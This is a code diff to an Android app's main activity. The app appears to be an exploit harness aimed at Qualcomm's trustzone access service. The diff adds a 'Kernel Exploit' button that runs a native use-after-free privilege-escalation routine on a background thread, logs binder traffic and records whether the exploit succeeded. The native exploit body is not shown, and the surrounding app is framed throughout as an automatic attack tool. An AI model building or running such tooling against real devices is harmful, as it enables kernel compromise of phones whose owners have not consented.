@@ -42,7 +42,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
 
     private TextView tvStatus, tvLog;
-    private Button btnStart, btnStop, btnAddOnly, btnStartServer;
+    private Button btnStart, btnStop, btnAddOnly, btnStartServer, btnKernelExploit;
     private Handler handler = new Handler(Looper.getMainLooper());
     private StringBuilder logBuilder = new StringBuilder();
     private IMinkSocketFd tzService;
@@ -98,6 +98,7 @@ public class MainActivity extends AppCompatActivity {
         btnStop = findViewById(R.id.btn_stop);
         btnAddOnly = findViewById(R.id.btn_add_only);
         btnStartServer = findViewById(R.id.btn_start_server);
+        btnKernelExploit = findViewById(R.id.btn_kernel_exploit);
 
         requestPermissions();
 
@@ -156,9 +157,30 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        btnKernelExploit.setOnClickListener(v -> {
+            if (!isTesting.get()) {
+                isTesting.set(true);
+                enableButtons(false, true);
+                stopRequested.set(false);
+                testThread = new Thread(() -> {
+                    appendLog("=== Starting Kernel UAF Exploit ===");
+                    String outputPath = getDumpDir() + "/cve_result.txt";
+                    String logPath = getDumpDir() + "/binder_traffic.log";
+                    int result = nativeExploit(outputPath, logPath);
+                    appendLog("[*] Exploit result: " + (result == 1 ? "SUCCESS" : "FAILED"));
+                    updateStatus("Exploit " + (result == 1 ? "succeeded" : "failed"));
+                    isTesting.set(false);
+                    enableButtons(true, false);
+                    saveLog();
+                });
+                testThread.start();
+            }
+        });
+
         appendLog("App started.");
         appendLog("Press 'Start Full Exploit' for automatic attack.");
         appendLog("Or use 'Add Service' + 'Start Server' manually.");
+        appendLog("New: 'Kernel Exploit' attempts UAF escalation.");
     }
 
     private void requestPermissions() {
@@ -204,6 +226,9 @@ public class MainActivity extends AppCompatActivity {
         handler.post(() -> {
             btnStart.setEnabled(startEnabled);
             btnStop.setEnabled(stopEnabled);
+            btnAddOnly.setEnabled(startEnabled);
+            btnStartServer.setEnabled(startEnabled);
+            btnKernelExploit.setEnabled(startEnabled);
         });
     }
 
